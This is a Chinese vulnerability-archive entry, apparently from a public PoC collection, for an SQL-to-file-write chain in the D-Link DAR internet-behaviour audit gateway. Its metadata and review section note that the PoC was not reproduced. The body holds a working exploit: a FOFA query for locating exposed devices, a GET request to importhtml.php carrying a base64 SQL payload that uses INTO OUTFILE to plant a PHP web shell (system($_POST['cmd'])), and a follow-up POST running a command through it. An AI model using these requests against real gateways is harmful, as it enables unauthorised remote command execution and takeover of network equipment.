---
source: "wy876 漏洞文库"
id: "vw-9f889b84ae97f08983daf21e"
entity_id: "ve-9f889b84ae97f08983daf21e"
schema_version: "1"
previous_fofa_unverified: "mask.style.visibility"
title: "D-Link DAR importhtml.php SQL 执行与文件写入链"
product: "D-Link DAR审计网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "含PHPSESSID，DB FILE权限/secure_file_priv及webroot可写，PHP解析"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/D-Link/D-LinkDAR%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E5%AE%A1%E8%AE%A1%E7%BD%91%E5%85%B3importhtml%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qh15q6k18whqbdt8"
source_status: "recorded"
fofa: "\"mask.style.visibility\" && title=\"D-Link\""
---

# D-Link DAR importhtml.php SQL 执行与文件写入链

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：D-Link DAR审计网关
- 本文讨论：importhtml.php sql任意SQL到OUTFILE
- 版本、权限与配置前提：含PHPSESSID，DB FILE权限/secure_file_priv及webroot可写，PHP解析
- 资料类型：SQL写文件至PHP执行链；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题命令执行应标SQL到文件执行链而非shell参数注入
- 无SQL/脚本执行响应，权限和具体型号固件缺失
- payload十六进制为双引号cmd而解释单引号，语义等价可规范但非根因错误
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 会话权限、OUTFILE限制和实际构建待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
D-Link DAR上网行为审计网关可以为企业提供完善的互联网访问行为管理解决方案，全面保护企业的运营效率和信息安全。DAR系列产品提供全面的应用识别和控制能力、精细化的应用层带宽管理能力、分类化的海量URL过滤能力、详尽的上网行为审计能力以及丰富的上网行为报表，从而帮助企业快速构建可视化、低成本以及高效安全的商业网络。D-Link上网行为管理系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

# 二、影响版本
+ D-Link DAR上网行为审计网关

# 三、资产测绘
+ fofa`"mask.style.visibility" && title="D-Link"`
+ 特征


# 四、漏洞复现
通过poc写入文件

```http
GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Connection: close
```


其中`c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn`是`select 0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e into outfile '/usr/hddocs/nsg/app/hellodlink.php'`的`base64`编码。

`0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e`为十六进制编码的字符串，表示以下代码

```plain
<?php echo system($_POST['cmd']);?>
```

写入文件位置

```http
POST /app/hellodlink.php HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qh15q6k18whqbdt8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
